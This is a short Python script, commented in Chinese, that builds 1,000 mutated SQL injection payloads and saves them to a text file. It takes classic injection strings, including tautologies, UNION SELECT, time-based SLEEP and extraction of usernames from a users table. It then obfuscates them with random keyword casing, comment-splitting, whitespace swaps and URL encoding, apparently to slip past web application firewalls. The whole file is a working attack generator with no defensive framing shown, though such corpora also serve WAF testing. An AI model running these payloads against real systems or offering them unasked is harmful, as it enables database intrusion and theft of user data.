import random
import urllib.parse

# 基础攻击模板（抽象化）
base_payloads = [
    "' OR 1=1 --",
    "' OR 'a'='a' --",
    "' UNION SELECT 1,2,3 --",
    "' OR EXISTS(SELECT * FROM users) --",
    "' OR (SELECT COUNT(*) FROM users)>0 --",
    "' OR IF(1=1,SLEEP(5),0) --",
    "' OR (SELECT database()) --",
    "' OR (SELECT GROUP_CONCAT(username) FROM users) --",
]

keywords = ["SELECT", "UNION", "OR", "AND", "WHERE", "FROM", "SLEEP", "EXISTS"]

comments = [
    "/**/",
    "/*!50000*/",
    "--",
    "#",
    "/*random*/"
]

whitespaces = [
    " ",
    "\t",
    "\n",
    "%09",
    "%0a"
]


# 随机大小写
def random_case(word):
    return ''.join(
        c.upper() if random.random() > 0.5 else c.lower()
        for c in word
    )


# 插入随机注释拆分关键字
def split_keyword(word):
    if len(word) <= 2:
        return word
    pos = random.randint(1, len(word)-1)
    return word[:pos] + random.choice(comments) + word[pos:]


# 随机替换关键字
def mutate_keywords(payload):
    for kw in keywords:
        if kw in payload.upper():
            new_kw = random_case(kw)
            if random.random() > 0.5:
                new_kw = split_keyword(new_kw)
            payload = payload.replace(kw, new_kw)
            payload = payload.replace(kw.lower(), new_kw)
    return payload


# 随机替换空白
def mutate_whitespace(payload):
    return payload.replace(" ", random.choice(whitespaces))


# URL 编码变异
def maybe_url_encode(payload):
    if random.random() > 0.6:
        return urllib.parse.quote(payload)
    return payload


# 总变异函数
def generate_payload():
    payload = random.choice(base_payloads)
    payload = mutate_keywords(payload)
    payload = mutate_whitespace(payload)
    payload = maybe_url_encode(payload)
    return payload


# 生成 1000 条
payloads = [generate_payload() for _ in range(1000)]

# 保存
with open("mutated_sql_payloads.txt", "w", encoding="utf-8") as f:
    for p in payloads:
        f.write(p + "\n")

print("✅ 已生成 1000 条复杂变异 SQL payload")
